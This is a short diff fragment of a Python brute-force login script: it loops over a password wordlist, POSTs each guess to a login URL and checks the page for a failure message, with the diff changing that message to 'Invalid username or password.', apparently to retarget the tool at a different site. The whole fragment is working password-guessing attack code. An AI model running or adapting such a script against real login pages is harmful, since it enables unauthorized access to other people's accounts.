@@ -34,7 +34,7 @@ for password in file.readlines():
 
    send_data_url = requests.post(url, data=data)
 
-   if "You entered incorrect data" in str(send_data_url.content):
+   if "Invalid username or password." in str(send_data_url.content):
 
       print("[*] Attempting password: %s" % password)
 
